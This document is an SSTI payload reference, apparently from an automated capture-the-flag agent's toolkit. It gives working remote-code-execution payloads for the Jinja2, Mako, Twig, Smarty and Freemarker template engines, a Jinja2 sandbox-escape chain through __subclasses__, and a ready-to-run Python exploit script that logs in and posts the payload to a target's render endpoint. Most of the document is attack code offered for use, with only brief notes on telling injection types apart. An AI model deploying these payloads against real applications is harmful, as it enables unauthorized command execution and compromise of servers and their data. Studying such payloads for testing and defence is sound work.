# SSTI Engine Payload Reference

## Engine Detection from Source

Since this is whitebox, identify engine from imports — no blind probe needed:
```python
# Jinja2 (Flask)
from jinja2 import Template
render_template_string(user_input)

# Mako
from mako.template import Template

# Tornado
self.render_string(user_input)

# Chameleon
from chameleon import PageTemplate

# Twig (PHP)
$twig->render($user_input)

# Smarty (PHP)
$smarty->display($user_input)

# Pebble / Freemarker (Java)
Template t = engine.getTemplate(userInput)
```

---

## Jinja2 (Python)

```
Confirm:
{{7*7}}        → 49
{{7*'7'}}      → 7777777

RCE (read flag):
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}

Alternative RCE:
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}

If globals blocked (sandbox):
{{''.__class__.mro()[1].__subclasses__()[XXX].__init__.__globals__['os'].popen('cat /flag').read()}}
# Find XXX: enumerate __subclasses__() to find subprocess.Popen or similar
```

## Mako (Python)

```
Confirm:
${7*7}

RCE:
${__import__('os').popen('cat /flag').read()}
```

## Twig (PHP)

```
Confirm:
{{7*7}}

RCE:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

## Smarty (PHP)

```
Confirm:
{7*7}

RCE:
{system('cat /flag')}
```

## Freemarker (Java)

```
Confirm:
${7*7}

RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
```

---

## Injection Type (Critical Distinction)

```python
# TYPE A — Direct render (full SSTI):
render_template_string(user_input)        # user controls template itself
Template(user_input).render()
# → Full SSTI. Use engine payloads above directly.

# TYPE B — Variable injection (limited):
render_template("page.html", name=user_input)   # user only controls variable value
# → Jinja2 auto-escapes by default → likely NOT exploitable unless |safe filter used
```

---

## Isolation Test Boilerplate

```python
# /tmp/aurelinth/test_ssti_isolation.py
from jinja2 import Environment

env = Environment()  # match app config exactly

# Confirm injection
user_input = "{{7*7}}"
result = env.from_string(user_input).render()
print("Confirm result:", result)  # expect: 49
assert result == "49", "SSTI not executing"

# Test RCE
rce_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
result = env.from_string(rce_payload).render()
print("RCE result:", result)
```

---

## Exploit Script

```python
# /tmp/aurelinth/exploit_ssti.py
import requests

BASE = "http://LOCAL_TARGET"
s = requests.Session()
s.post(f"{BASE}/login", data={"username":"pwn","password":"pwn"})

# Jinja2 RCE — read flag directly
payload = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"

r = s.post(f"{BASE}/render", data={"template": payload})
print(r.status_code, r.text[:300])
```

Adjust endpoint and parameter name from vuln_reasoner finding.
If flag not at `/flag`, use path from docker-compose.yml or .env.
